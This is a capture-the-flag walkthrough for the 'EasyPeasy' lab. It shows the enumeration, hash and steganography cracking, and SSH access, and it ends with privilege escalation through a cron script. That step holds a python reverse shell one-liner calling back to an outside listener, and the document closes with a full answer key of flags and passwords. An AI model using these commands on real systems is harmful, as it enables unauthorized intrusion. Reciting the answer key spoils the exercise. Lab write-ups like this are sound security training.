# EasyPeasy CTF
## 03-07-2022
## level : easy



## Enumeration Through Nmap

Scanning for open ports 
```
nmap -p- -T5 10.10.239.207 -Pn -oN nmap_easy.txt
```

Scanning for services running
```
nmap -p80,6498,65524 -sV 10.10.239.207 -oN service_version.txt
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many ports are open ? | 3 |
| What is the version of nginx ? | 1.16.1 |
| What is running on the highest port ? | Apache |




## Compromising the machine 

Scanning using GoBuster
```
gobuster dir -u http://10.10.239.207/ -w /usr/share/wordlists/dirb/common.txt -t 50 | tee data.txt 
```
Go to the hidden directory found `/hidden/whatever` and view the source to see the flag 1

For Flag 2 got to 
```
http://10.10.255.102:65524/robots.txt
```
Here we can see the hash value of flag 2
```
curl -s http://10.10.255.102:65524/robots.txt    
```

Now if we open the site at `http://10.10.255.102:65524/` we can see the flag 3 in the document
```
curl -s http://10.10.255.102:65524/ | grep -i flag

```

For the hidden directory 
```
curl -s http://10.10.255.102:65524/ | grep -i hidden
```
This lead to a encrypted value with base62 encryption. 
Decrypt it online


After going to the hidden direcory
```
curl -s http://10.10.255.102:65524/n0th1ng3ls3m4tt3r/
```

We find a hash value. lets crack it with john

```
john --format=gost --wordlist=easypeasy.txt hash
```

Now lets download the image availale into the hidden directory
```
wget http://10.10.255.102:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg

```

Crack the steghide password ( We can also extract using the password)
```
stegseek --seed binarycodepixabay.jpg 

```

SSH to the target 
```
ssh boring@10.10.255.102 -p 6498

```

find SUID set binary
```
find / -user root -perm -04000 -type f 2>/dev/null

```

To escalate privilege we need to modify a shell script which is running by the cronjob 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.48.110",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'


```

now open a netcat listener in the local machine and wait for some time and then boom.


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Using GoBuster find flag 1 | flag{f1rs7_fl4g} |
| Further enumerate the machine, what is the flag 2 | flag{1m_s3c0nd_fl4g} |
| Crack the hash with easypeasy.txt What is the flag3 ? | flag{9fdafbd64c47471a8f54cd3fc64cd312} |
| What is the hidden directory ? | /n0th1ng3ls3m4tt3r |
| Using the wordlist that provided to you in this task crack the hash. what is the password ? | mypasswordforthatjob |
| What is the password to login to the machine via ssh ? | iconvertedmypasswordtobinary |
| What is the user flag ? | flag{n0wits33msn0rm4l} |
| What is the root flag ? | flag{63a9f0ea7bb98050796b649e85481845} |









--------------------------    THE END    -------------------------- 
